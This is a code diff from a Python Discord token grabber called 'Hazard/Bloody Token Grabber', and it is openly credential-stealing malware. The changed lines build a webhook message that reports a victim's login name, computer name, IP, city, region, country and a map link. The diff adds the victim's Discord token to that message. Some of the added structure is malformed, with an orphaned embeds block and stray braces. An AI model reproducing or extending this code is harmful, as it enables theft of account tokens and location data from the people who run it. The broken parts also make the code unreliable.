@@ -280,16 +280,21 @@ class Hazard_Token_Grabber_V2:
             "embeds": [
                 {
                     "author": {
-                        "name": "Bloody Token Grabber.V2",
+                        "name": "Bloody Token Grabber",
                         "url": "https://discord.gg/dWtASkxMTf",
                         "icon_url": "https://i.pinimg.com/originals/e4/ee/3c/e4ee3c98ca208265da818f93a23814a9.gif"
                     },
-                    "description": f"**{os.getlogin()}** Just ran Bloody Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f"**{os.getlogin()}** Just ran Bloody Token Grabber\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n Discord Token: {token}```fix\n{self.fileCount}{self.files}```",
                     "color": 440000,
 
                     "thumbnail": {
-                      "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
-                    },       
+                      "url": "https://i.pinimg.com/originals/e4/ee/3c/e4ee3c98ca208265da818f93a23814a9.gif"
+                    },
+
+            "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
+            "embeds": [
+                {
+                    },
 
                     "footer": {
                       "text": "Thank You For Using Bloody-Grabber As Your Client"
